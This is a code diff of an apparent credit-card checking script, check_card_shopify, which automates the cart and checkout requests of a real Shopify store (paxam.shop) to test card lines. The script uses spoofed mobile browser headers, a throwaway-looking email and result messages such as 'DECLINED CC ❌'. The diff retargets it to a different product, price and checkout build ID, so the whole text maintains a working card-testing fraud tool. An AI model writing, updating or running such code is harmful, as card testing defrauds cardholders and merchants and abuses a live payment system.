@@ -261,7 +261,7 @@ def check_card_shopify(cc_line):
                 'accept': 'application/javascript',
                 'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
                 'origin': 'https://paxam.shop',
-                'referer': 'https://paxam.shop/products/routeins',
+                'referer': 'https://paxam.shop/products/self-portrait-cd',
                 'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
@@ -272,15 +272,14 @@ def check_card_shopify(cc_line):
             }
 
             data = {
-                'Title-1': '0.98',
                 'quantity': '1',
                 'form_type': 'product',
                 'utf8': '✓',
-                'id': '46767934210293',
-                'product-id': '9169421336821',
+                'id': '47328922632437',
+                'product-id': '9426412044533',
                 'section-id': 'template--18302998610165__main',
                 'sections': 'cart-notification-product,cart-notification-button,cart-icon-bubble',
-                'sections_url': '/products/routeins',
+                'sections_url': '/products/self-portrait-cd',
             }
             
             try:
@@ -351,7 +350,7 @@ ERROR ❌
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
                 'cache-control': 'max-age=0',
-                'referer': 'https://paxam.shop/products/routeins',
+                'referer': 'https://paxam.shop/products/self-portrait-cd',
                 'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
@@ -483,7 +482,7 @@ ERROR ❌
                 'shopify-checkout-client': 'checkout-web/1.0',
                 'user-agent': user_agents,
                 'x-checkout-one-session-token': x_checkout_one_session_token,
-                'x-checkout-web-build-id': '0cc063ad1bfa22c39a589145e2a1b66463881ee8',
+                'x-checkout-web-build-id': '3069eb618dfd384b317acd940cf92385a7bf7fca',
                 'x-checkout-web-deploy-stage': 'production',
                 'x-checkout-web-server-handling': 'fast',
                 'x-checkout-web-server-rendering': 'yes',
@@ -550,8 +549,8 @@ ERROR ❌
                                     'stableId': stable_id,
                                     'merchandise': {
                                         'productVariantReference': {
-                                            'id': 'gid://shopify/ProductVariantMerchandise/46767934210293',
-                                            'variantId': 'gid://shopify/ProductVariant/46767934210293',
+                                            'id': 'gid://shopify/ProductVariantMerchandise/47328922632437',
+                                            'variantId': 'gid://shopify/ProductVariant/47328922632437',
                                             'properties': [],
                                             'sellingPlanId': None,
                                             'sellingPlanDigest': None,
@@ -564,7 +563,7 @@ ERROR ❌
                                     },
                                     'expectedTotalPrice': {
                                         'value': {
-                                            'amount': '0.98',
+                                            'amount': '15.99',
                                             'currencyCode': 'USD',
                                         },
                                     },
@@ -616,7 +615,7 @@ ERROR ❌
                                     },
                                     'amount': {
                                         'value': {
-                                            'amount': '0.98',
+                                            'amount': '2.13',
                                             'currencyCode': 'USD',
                                         },
                                     },
@@ -638,7 +637,7 @@ ERROR ❌
                             'customer': {
                                 'presentmentCurrency': 'USD',
                             },
-                            'email': 'caleboh973@maonyn.com',
+                            'email': 'hellomohitv2@tiffincrane.com',
                             'emailChanged': False,
                             'phoneCountryCode': 'US',
                             'marketingConsent': [],
@@ -655,7 +654,7 @@ ERROR ❌
                             'proposedAllocations': None,
                             'proposedTotalAmount': {
                                 'value': {
-                                    'amount': '0',
+                                    'amount': '2.13',
                                     'currencyCode': 'USD',
                                 },
                             },
@@ -692,7 +691,7 @@ ERROR ❌
                     'metafields': [],
                     'analytics': {
                         'requestUrl': f'https://paxam.shop/checkouts/cn/{chk_token}',
-                        'pageId': '9d380592-5674-4B42-95D8-0C884DA9CDA9',
+                        'pageId': 'f9b64914-C969-4C9A-47FD-0B2AAC973665',
                     },
                 },
                 'operationName': 'SubmitForCompletion',
@@ -797,7 +796,7 @@ DECLINED CC ❌
                 'shopify-checkout-client': 'checkout-web/1.0',
                 'user-agent': user_agents,
                 'x-checkout-one-session-token': x_checkout_one_session_token,
-                'x-checkout-web-build-id': '0cc063ad1bfa22c39a589145e2a1b66463881ee8',
+                'x-checkout-web-build-id': '3069eb618dfd384b317acd940cf92385a7bf7fca',
                 'x-checkout-web-deploy-stage': 'production',
                 'x-checkout-web-server-handling': 'fast',
                 'x-checkout-web-server-rendering': 'yes',
